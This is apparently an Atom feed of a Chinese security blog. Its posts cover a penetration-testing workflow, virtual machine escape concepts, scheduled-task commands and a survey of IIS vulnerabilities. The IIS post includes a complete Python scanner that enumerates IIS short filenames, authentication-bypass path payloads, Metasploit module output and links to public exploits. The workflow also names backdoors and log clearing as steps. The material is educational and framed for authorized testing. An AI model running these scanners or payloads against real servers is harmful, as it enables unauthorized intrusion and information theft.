<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-29T08:44:10-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">渗透测试流程</title><link href="http://localhost:4000/_posts/2020-07-29-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" rel="alternate" type="text/html" title="渗透测试流程" /><published>2020-07-29T00:00:00-04:00</published><updated>2020-07-29T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-29-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;明确目标&quot;&gt;明确目标&lt;/h1&gt;

&lt;h2 id=&quot;确定范围&quot;&gt;确定范围&lt;/h2&gt;

&lt;p&gt;IP、域名、内外网、整站、部分模块……&lt;/p&gt;

&lt;h2 id=&quot;确定规则&quot;&gt;确定规则&lt;/h2&gt;

&lt;p&gt;能渗透到什么程度,是发现漏洞即可还是需要利用该漏洞、时间限制、能否修改上传、能否提权……&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目标系统介绍、重点保护对象及特性&lt;/p&gt;

  &lt;p&gt;是否允许破坏数据？&lt;/p&gt;

  &lt;p&gt;是否允许阻断业务正常运行&lt;/p&gt;

  &lt;p&gt;测试之前是否应当知会甲方安全部门，IP是否需要加白&lt;/p&gt;

  &lt;p&gt;接入方式？外网和内网？&lt;/p&gt;

  &lt;p&gt;测试是发现问题即可，还是尽可能发现更多问题&lt;/p&gt;

  &lt;p&gt;测试过程是否需要考虑社会工程手段&lt;/p&gt;

  &lt;p&gt;测试过程中要求完全仿真，除了破坏操作需要报备，其余手段不受限制还是如何&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;确定需求&quot;&gt;确定需求&lt;/h2&gt;

&lt;p&gt;上线前的web应用测试、业务逻辑漏洞测试、人员权限管理漏洞测试&lt;/p&gt;

&lt;h1 id=&quot;分析风险获得授权&quot;&gt;分析风险，获得授权&lt;/h1&gt;

&lt;p&gt;需分析渗透过程可能产生的风险：测试是否对系统产生影响、带宽占用、系统资源消耗、爆破测试行为或其他可能触发动态感知系统或其他告警机制、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本……&lt;/p&gt;

&lt;p&gt;由乙方书写实施方案初稿提交给甲方或公司内部审核,审核通过后，测试人必须拿到正规的乙方书面委托授权书才能开工，代理商第三方授权不具备法律效力，若是第三方授权，必须拿到甲方给中间商的授权，且注明中间商有转让授权的权限，这样中间商下发的授权测试才是合法的。需要提前跟甲方确认是否能提供测试账号，测试账号最好覆盖各个权限级别，金融行业或者交易类的测试账号需要账户中有一定的余额……&lt;/p&gt;

&lt;h1 id=&quot;信息搜集&quot;&gt;信息搜集&lt;/h1&gt;

&lt;p&gt;信息搜集的方法很多，不详细阐述，大概列举如下:&lt;/p&gt;

&lt;p&gt;方 式：主动扫描+开放搜索&lt;/p&gt;

&lt;p&gt;基础信息：IP、网段、域名、端口……&lt;/p&gt;

&lt;p&gt;系统信息：操作系统版本……&lt;/p&gt;

&lt;p&gt;应用信息：各端口应用、例如web应用、邮件应用、脚本语言类型、目录结构、数据库类型、web框架……&lt;/p&gt;

&lt;p&gt;版本信息：所有探测到的版本&lt;/p&gt;

&lt;p&gt;服务信息: 服务器类型、版本&lt;/p&gt;

&lt;p&gt;人员信息: 域名注册人信息，web应用中网站发帖人的id,管理员姓名等&lt;/p&gt;

&lt;p&gt;防护信息：尝试探测防护设备&lt;/p&gt;

&lt;h1 id=&quot;漏洞探测&quot;&gt;漏洞探测&lt;/h1&gt;

&lt;p&gt;汇总信息搜集到的信息，使用与之匹配的漏洞检测策略&lt;/p&gt;

&lt;p&gt;方法:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1.漏扫:AWVS、AppScan、Nessus……&lt;/p&gt;

  &lt;p&gt;2.漏扫结果去exploit-db等位置找利用&lt;/p&gt;

  &lt;p&gt;3.在网上寻找验证POC&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;内容:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;系统漏洞:系统没能及时更新补丁&lt;/p&gt;

  &lt;p&gt;Webserver漏洞:webserver配置问题……&lt;/p&gt;

  &lt;p&gt;Web应用漏洞:Web应用开发问题、错误页面未定义、后台暴露……&lt;/p&gt;

  &lt;p&gt;其他端口服务器漏洞:诸如21/8080(st2)/7001/22/3389……&lt;/p&gt;

  &lt;p&gt;通信安全：明文传输、token在cookie中传送……&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;漏洞验证&quot;&gt;漏洞验证&lt;/h1&gt;

&lt;p&gt;通过自己经验分析可能成功利用的全部漏洞都验证一遍，结合实施环境，搭建模拟环境进行试验，利用成功后再实施在目标系统中&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;自动化验证:结合自动化扫描工具发现的结果&lt;/p&gt;

  &lt;p&gt;手工验证:利用公开资源进行验证&lt;/p&gt;

  &lt;p&gt;试验验证:自己搭建模拟环境进行验证&lt;/p&gt;

  &lt;p&gt;登录猜测:尝试猜测登录、万能密码、注入&lt;/p&gt;

  &lt;p&gt;业务漏洞验证:发现后该漏洞，进行验证&lt;/p&gt;

  &lt;p&gt;公开资源利用:exploit-db/wooyun/、渗透代码网站、通用、缺省口令、厂商的漏洞告警……&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;信息分析&quot;&gt;信息分析&lt;/h1&gt;

&lt;p&gt;实施渗透的准备环节&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;精准攻击:利用4&amp;gt;探测到的EXP,进行精准攻击&lt;/p&gt;

  &lt;p&gt;绕过防御机制:检测是否有WAF等，绕过策略筹划&lt;/p&gt;

  &lt;p&gt;定制攻击路径:最佳攻击路径、主要根据薄弱入口，高内网权限位置，最终目标等&lt;/p&gt;

  &lt;p&gt;绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码（免杀）检测&lt;/p&gt;

  &lt;p&gt;攻击代码：试验得来的代码，包括不限于xss代码,sql注入语句……&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;利用漏洞&quot;&gt;利用漏洞&lt;/h1&gt;

&lt;p&gt;实施攻击:根据前几步的结果，实施精准攻击&lt;/p&gt;

&lt;p&gt;获取内部信息:基础设施(网络连接、vpn、路由、网络拓扑、内网IT资产……)&lt;/p&gt;

&lt;p&gt;横向渗透:内网入侵、敏感目标&lt;/p&gt;

&lt;p&gt;持续性存在:一般情况，甲方不需要，rookit、后门、添加管理员账号、驻扎手法等&lt;/p&gt;

&lt;p&gt;清除痕迹:清理渗透相关日志（访问、操作），漏扫，上传文件等&lt;/p&gt;

&lt;h1 id=&quot;信息整理&quot;&gt;信息整理&lt;/h1&gt;

&lt;p&gt;整理渗透工具：整理渗透中使用的代码、POC、EXP等。&lt;/p&gt;

&lt;p&gt;整理收集信息：整个渗透过程中收集的一切信息。&lt;/p&gt;

&lt;p&gt;整理漏洞信息：整个渗透过程中利用成功的所有漏洞，各种脆弱位置信息，为书写渗透报告做准备。&lt;/p&gt;

&lt;h1 id=&quot;形成报告&quot;&gt;形成报告&lt;/h1&gt;

&lt;p&gt;按需整理：按照之前第一步跟甲方确认的范围、需求来整理资料，技术细节尽可能的详细，形成报告进行交付。&lt;/p&gt;

&lt;p&gt;补充介绍：需对漏洞成因，验证过程中带来的危害进行分析&lt;/p&gt;

&lt;p&gt;修补建议：给开发或运维人员提出合理高效安全的解决方案&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">虚拟机逃逸</title><link href="http://localhost:4000/_posts/2020-07-29-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8/" rel="alternate" type="text/html" title="虚拟机逃逸" /><published>2020-07-29T00:00:00-04:00</published><updated>2020-07-29T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-29-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;虚拟化方案有：&lt;strong&gt;软件虚拟化&lt;/strong&gt;、&lt;strong&gt;半虚拟化&lt;/strong&gt;、&lt;strong&gt;硬件虚拟化&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;软件虚拟化&quot;&gt;&lt;strong&gt;软件虚拟化&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;是指将虚拟机的指令流交给虚拟机核心层进行分析，将非特权指令直接交给CPU运行，特权指令交给虚拟机核心层执行。&lt;/p&gt;

&lt;h1 id=&quot;半虚拟化&quot;&gt;&lt;strong&gt;半虚拟化&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;是改造GuestOS(虚拟机内的系统)，使让GuestOS知道他在虚拟机环境中，使其只使用非特权指令（准确说是避免使用具有虚拟化缺陷的特权指令），需要用到特权操作时使用hypercall的方式请求虚拟机核心层代为完成&lt;/p&gt;

&lt;h1 id=&quot;硬件虚拟化&quot;&gt;&lt;strong&gt;硬件虚拟化&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;是芯片级别的虚拟化支持，克服x86虚拟化缺陷问题，无需改造GuestOS：将虚拟机运行在Ring1模式下，所有指令交给硬件执行。对于特权指令CPU不会直接执行，将其捕获交给虚拟机核心层进行处理&lt;/p&gt;

&lt;p&gt;典型代表：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;软件虚拟化：早期的vmware，qemu&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;半虚拟化：Xen&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;硬件虚拟化：vmware，kvm+qemu&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;逃逸方式1局域网攻击&quot;&gt;&lt;strong&gt;逃逸方式1：局域网攻击&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;此种方式不多说，因为本不属于逃逸范畴，但实际上却可以达到同等的目的。原理是利用局域网漏洞进行感染提权。著名代表就是永恒之蓝。&lt;/p&gt;

&lt;h1 id=&quot;逃逸方式2软件漏洞逃逸&quot;&gt;&lt;strong&gt;逃逸方式2：软件漏洞逃逸&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Xen是重灾区域。半虚拟化系统无需硬件级别支持，效率极高的，但代价是改造GuestOS，虚拟机核心层需要大量代码来帮助GuestOS进行特权操作。是所有虚拟化方案中复杂度最高的一种。系统越复杂，安全性越低，所以Xen的半虚拟化经常被作为攻击的对象。曾听业内朋友说过思捷和威睿在竞标虚拟化时，威睿的团队的人经常给客户演示如何在Xen平台下做逃逸，导致思捷经常因为这个问题竞标失败。&lt;/p&gt;

&lt;h1 id=&quot;逃逸方式3硬件漏洞逃逸&quot;&gt;&lt;strong&gt;逃逸方式3：硬件漏洞逃逸&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;上面说了虚拟化的原理，再此做一次简单的总结：&lt;strong&gt;虚拟机运行在低权限的CPU状态，非指令交给CPU执行，特权指令交给虚拟机核心层执行&lt;/strong&gt;。若CPU有某种漏洞或后门：能使软件在低权限状态通过运行特定指令代码序列进入到高权限状态，那么虚拟机核心层则不再能对GuestOS运行的特权代码进行捕获处理。这时虚拟机内部的系统直接拥有了CPU的最高权限，可以随意践踏宿主系统的一切资源。此种攻击方式的代表：我不知道，但不代表没有，也许国家级别的安全实验室拥有此种技术。&lt;/p&gt;

&lt;p&gt;那么退一步，不取得最高权限，访问宿主机上的敏感数据是否可行？&lt;strong&gt;这个是可行的，17年底，18年初时，Intel/AMD公司的处理器纷纷爆出因指令预测机制未充分考虑旁路嗅探攻击。导致软件可以在Ring3的状态下，通过一些巧妙的手段嗅探出受CPU保护的敏感数据。&lt;/strong&gt;这个漏洞实际上对普通用户的影响甚小，但影响最大的则是各大云平台，因为云上任意一台虚拟机内，可以通过这个漏洞嗅探宿主机的数据，甚至是运行在同一个宿主机上其他虚拟机的数据。所以Intel/AMD出漏洞以后第一时间向各大云服务商披露硬件漏洞以及提供缓解方法。&lt;/p&gt;

&lt;h1 id=&quot;例子分析&quot;&gt;例子分析&lt;/h1&gt;

&lt;p&gt;VMware Workstation和Fusion中的拖放（DnD）功能含有越界内存访问漏洞。 这会允许访客在运行Workstation或Fusion的操作系统上执行代码。VMware实现了多种虚拟机（下文称为guest）与宿主机（下文称文host）之间的通信方式。其中一种方式是通过一个叫做Backdoor的接口，guest只需在用户态就可以通过该接口发送命令。VMware Tools也部分使用了这种接口来和host通信。&lt;/p&gt;

&lt;p&gt;针对Vmware的虚拟机逃逸的exploit源码GitHub早已公布(https://github.com/unamer/vmware_escape)。实现了从虚拟机到宿主机器的代码执行，弹出了熟悉的计算器。该开源代码，只需要将执行计算器部分的shellcode替换成其他具有恶意攻击的代码，就可以造成很大的危害。借鉴各位大神的分析，本文重点分析复现虚拟机逃逸典型漏洞CVE-2017-4901，当然还有其他几个CVE漏洞，能力有限，就不一一复现。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Vmware Workstation 12.5.5以前的版本&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">linux&amp;amp;win计划任务</title><link href="http://localhost:4000/_posts/2020-07-27-linux&win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" rel="alternate" type="text/html" title="linux&amp;win计划任务" /><published>2020-07-27T00:00:00-04:00</published><updated>2020-07-27T00:00:00-04:00</updated><id>http://localhost:4000/_posts/linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-27-linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;linux&quot;&gt;linux&lt;/h1&gt;

&lt;h2 id=&quot;at&quot;&gt;at&lt;/h2&gt;

&lt;p&gt;at在ubuntu，kali里面都是没有预先装好的&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;安装:sudo apt-get install at&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;at: invalid option -- '-'
Usage: at [-V] [-q x] [-f file] [-mMlbv] timespec ...
       at [-V] [-q x] [-f file] [-mMlbv] -t time
       at -c job ...
       atq [-V] [-q x]
       at [ -rd ] job ...
       atrm [-V] job ...
       batch
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;-V	版本&lt;/p&gt;

  &lt;p&gt;-q x	使用队列&lt;/p&gt;

  &lt;p&gt;-f file 使用文件&lt;/p&gt;

  &lt;p&gt;-m	发邮件&lt;/p&gt;

  &lt;p&gt;-M	不发邮件&lt;/p&gt;

  &lt;p&gt;-l	显示设置任务列表&lt;/p&gt;

  &lt;p&gt;-d x	删除编号为x的任务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;按ctrl+D来提交任务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;batch&quot;&gt;&lt;strong&gt;batch&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;batch不需要设置时间，那么不需要设置时间，它的任务是怎么执行的呢&lt;/p&gt;

&lt;p&gt;在系统平均负载量降到 0.8 以下时执行某项一次性的任务&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-f file    使用文件里面的shell脚本
-q x　　　　将计划任务加入某个队列
-m    　　　发送邮件给用户
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;crontab&quot;&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ~ crontab --help
crontab: 不适用的选项 -- -
crontab: usage error: unrecognized option
usage:	crontab [-u user] file
	crontab [ -u user ] [ -i ] { -e | -l | -r }
		(default operation is replace, per 1003.2)
	-e	(edit user's crontab)
	-l	(list user's crontab)
	-r	(delete user's crontab)
	-i	(prompt before deleting user's crontab)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;-e　　　　进入编写
-l　　　　列出任务
-r　　　　删除任务
-i　　　　删除前给提示
-u　　　　指定某用户运行任务
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;每条计划任务的格式书写如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;min 　　hour 　　day 　　month 　　week 　　[user] 　　command
0-59　　0-23　　 1-31　　1-12　　　0-7　　　　　　　　　　echo &quot;sijidou&quot; &amp;gt; /home/sijidou/Desktop/1.tx
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;前面5个参数可以是这些形式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;每个参数间用空格隔开
*        表示任意
1,2      表示1,2号都可以（这里假设是day的值）
1-20    表示1号到20号都可以（这里假设是day的值）
/10      表示每隔10天就执行一次（这里假设是day的值）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;举例:&lt;/p&gt;

&lt;p&gt;每月每周每日每小时51分的在桌面上生成有着”hello world”的1.txt文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;51 * * * * echo &quot;hello world&quot; &amp;gt; /home/sijidou/Desktop/1.tx
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;windows&quot;&gt;windows&lt;/h1&gt;

&lt;h2 id=&quot;at-1&quot;&gt;at&lt;/h2&gt;

&lt;p&gt;at命令是比较简单的一个命令，但是后面不常用了&lt;/p&gt;

&lt;p&gt;使用必须是administrator权限，并且win8之后没有这个命令了&lt;/p&gt;

&lt;h2 id=&quot;schtasks&quot;&gt;&lt;strong&gt;schtasks&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;schtasks功能丰富，应该算是windows下计划任务最主要的工具之一了&lt;/p&gt;

&lt;p&gt;适用环境是win7~win10都可以&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/Create         创建新计划任务。
/Delete         删除计划任务。
/Query          显示所有计划任务。
/Change         更改计划任务属性。
/Run            按需运行计划任务。
/End            中止当前正在运行的计划任务。
/ShowSid        显示与计划的任务名称相应的安全标识符。
创建新计划任务
SCHTASKS /Create [/S system [/U username [/P [password]]]][/RU username [/RP password]] /SC schedule [/MO modifier] [/D day][/M months][/I idletime]/TN taskname /TR taskrun [/ST starttime][/RIinterval] [{/ET endtime | /DU duration} [/K] [/XML xmlfile][/V1]] [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F]
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">IIS漏洞</title><link href="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" rel="alternate" type="text/html" title="IIS漏洞" /><published>2020-07-26T00:00:00-04:00</published><updated>2020-07-26T00:00:00-04:00</updated><id>http://localhost:4000/_posts/IIS%E6%BC%8F%E6%B4%9E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;iis&quot;&gt;IIS&lt;/h1&gt;

&lt;p&gt;IIS是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。&lt;/p&gt;

&lt;p&gt;其是一种web服务组件，其中包括WEB服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。&lt;/p&gt;

&lt;p&gt;目前,IIS一共发行了12个版本，从IIS1.0到IIS10.0,web市场上主要以IIS5.0到IIS10.0为主。&lt;/p&gt;

&lt;p&gt;对于IIS漏洞主要分布在缓冲区溢出、认证绕过、DOS拒绝服务、代码执行和信息泄露&lt;/p&gt;

&lt;h1 id=&quot;ms09-053cve-2009-3023&quot;&gt;MS09-053/CVE-2009-3023&lt;/h1&gt;

&lt;p&gt;Microsoft-IIS-FTPd服务MLST命令栈缓冲区溢出漏洞&lt;/p&gt;

&lt;p&gt;影响版本：IIS5.5、IIS5.1、IIS6.0&lt;/p&gt;

&lt;p&gt;漏洞详情：IIS内嵌的FTP服务器中存在栈溢出漏洞，如果远程攻击者对带有特制名称的目录发布了包含有通配符的FTP&lt;code&gt;NLST&lt;/code&gt;(name list)命令即可触发该溢出，导致拒绝服务或执行任意代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msf5 &amp;gt; search ms09-053

Matching Modules
================

   #  Name                                           Disclosure Date  Rank    Check  Description
   -  ----                                           ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/ftp/iis_list_exhaustion  2009-09-03       normal  No     Microsoft IIS FTP Server LIST Stack Exhaustion
   1  exploit/windows/ftp/ms09_053_ftpd_nlst         2009-08-31       great   No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
Interact with a module by name or index, for example use 1 or use exploit/windows/ftp/ms09_053_ftpd_nlst
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;条件：拥有写权限&lt;/p&gt;

&lt;p&gt;修补：修改NTFS文件权限或修改不允许FTP写权限或不允许FTP匿名登录或安装补丁&lt;/p&gt;

&lt;h1 id=&quot;认证绕过&quot;&gt;认证绕过&lt;/h1&gt;

&lt;p&gt;影响版本：IIS6.0、IIS7.5&lt;/p&gt;

&lt;p&gt;漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问&lt;/p&gt;

&lt;p&gt;攻击手段：&lt;/p&gt;

&lt;p&gt;IIS6.0&lt;/p&gt;

&lt;p&gt;将&lt;code&gt;::$INDEX_ALLOCATION&lt;/code&gt;后缀添加到目录名称后，如&lt;code&gt;/admin::$INDEX_ALLOCATION/index.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;IIS7.5&lt;/p&gt;

&lt;p&gt;将&lt;code&gt;:$i30:$INDEX_ALLOCATION&lt;/code&gt;后缀添加到目录名称后，如&lt;code&gt;/admin:$i30:$INDEX_ALLOCATION/index.asp&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;短文件名泄露&quot;&gt;短文件名泄露&lt;/h1&gt;

&lt;p&gt;影响版本：IIS5.0-IIS10.0&lt;/p&gt;

&lt;p&gt;漏洞详情：Windows支持以8.3格式生成与MS-DOS兼容的（短）文件名，以允许基于MS-DOS或16位Windows的程序访问这些文件。基于Windows的IIS服务器默认根目录C:\inetpub\wwwroot下的网页脚本文件和目录符合一定条件时，会生成相应的短文件名。此时，攻击者利用HTTP的DEBUG、OPTIONS、GET、POST、HEAD、TRACE等方法携带波浪号，可以对IIS服务器短文件名进行暴力猜解，依据返回的页面信息和状态码来确认真实存在的文件名，从而获取服务器敏感信息。&lt;/p&gt;

&lt;p&gt;检测脚本:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sys
import httplib
import urlparse
import threading
import Queue
import time


class Scanner():
    def __init__(self, target):
        self.target = target.lower()
        if not self.target.startswith('http'):
            self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, params, query, fragment = \
                     urlparse.urlparse(target)
        if self.path[-1:] != '/':    # ends with slash
            self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = Queue.Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = ''
        self.msg_queue = Queue.Queue()
        self.STOP_ME = False
        threading.Thread(target=self._print).start()

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc)
            else:
                conn = httplib.HTTPConnection(self.netloc)
            return conn
        except Exception, e:
            print '[_conn.Exception]', e
            return None

    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request(self.request_method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception, e:
            raise Exception('[_get_status.Exception] %s' % str(e) )

    def is_vul(self):
        try:
            for _method in ['GET', 'OPTIONS']:
                self.request_method = _method
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
                if status_1 == 404 and status_2 != 404:
                    return True
            return  False
        except Exception, e:
            raise Exception('[is_vul.Exception] %s' % str(e) )

    def run(self):
        for c in self.alphanum:
            self.queue.put( (self.path + c, '.*') )    # filename, extension
        for i in range(20):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        for t in self.threads:
            t.join()
        self.STOP_ME = True

    def report(self):
        print '-'* 64
        for d in self.dirs:
            print 'Dir:  %s' % d
        for f in self.files:
            print 'File: %s' % f
        print '-'*64
        print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
        print 'Note that * is a wildcard, matches any character zero or more times.'

    def _print(self):
        while not self.STOP_ME or (not self.msg_queue.empty()):
            if self.msg_queue.empty():
                time.sleep(0.05)
            else:
                print self.msg_queue.get()

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))

                    if len(url) - len(self.path)&amp;lt; 6:    # enum first 6 chars only
                        for c in self.alphanum:
                            self.queue.put( (url + c, ext) )
                    else:
                        if ext == '.*':
                            self.queue.put( (url, '') )

                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')

                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')

                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put( (url, ext[:-1] + c + '*') )
                                if len(ext) &amp;lt; 4:    # &amp;lt; len('.as*')
                                    self.queue.put( (url, ext[:-1] + c) )

            except Queue.Empty,e:
                break
            except Exception, e:
                print '[Exception]', e


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
        sys.exit()

    target = sys.argv[1]
    s = Scanner(target)
    if not s.is_vul():
        s.STOP_ME = True
        print 'Server is not vulnerable'
        sys.exit(0)

    print 'Server is vulnerable, please wait, scanning...'
    s.run()
    s.report()
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;put漏洞&quot;&gt;PUT漏洞&lt;/h1&gt;

&lt;p&gt;漏洞详情：对IIS的错误配置导致的写权限漏洞。WEB服务器拓展里设置了&lt;code&gt;WebDAV&lt;/code&gt;为允许，同时网站权限配置开启了写入权限与脚本资源访问权限。通过该PUT漏洞可以写入webshell&lt;/p&gt;

&lt;p&gt;方法:&lt;/p&gt;

&lt;p&gt;https://www.codercto.com/a/48257.html&lt;/p&gt;

&lt;h1 id=&quot;ms15-034cve-2015-1635&quot;&gt;MS15-034/CVE-2015-1635&lt;/h1&gt;

&lt;p&gt;漏洞详情： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。&lt;/p&gt;

&lt;p&gt;攻击手段： https://www.freebuf.com/articles/system/64185.html&lt;/p&gt;

&lt;h1 id=&quot;cve-2017-7269&quot;&gt;CVE-2017-7269&lt;/h1&gt;

&lt;p&gt;IIS远程代码执行漏洞&lt;/p&gt;

&lt;p&gt;影响版本：IIS6.0&lt;/p&gt;

&lt;p&gt;漏洞详情：开启&lt;code&gt;WebDAV&lt;/code&gt;服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用。&lt;/p&gt;

&lt;p&gt;攻击手段： https://github.com/zcgonvh/cve-2017-7269&lt;/p&gt;

&lt;h1 id=&quot;iis解析漏洞&quot;&gt;IIS解析漏洞&lt;/h1&gt;

&lt;p&gt;影响版本：IIS5.0-6.0、IIS7.0&lt;/p&gt;

&lt;p&gt;漏洞详情：&lt;/p&gt;

&lt;p&gt;1、IIS5.0-6.0下，如果一个目录以”xxx.asp”的形式命名，那么该目录下的所有类型文件都会被当做asp文件来进行解析执行&lt;/p&gt;

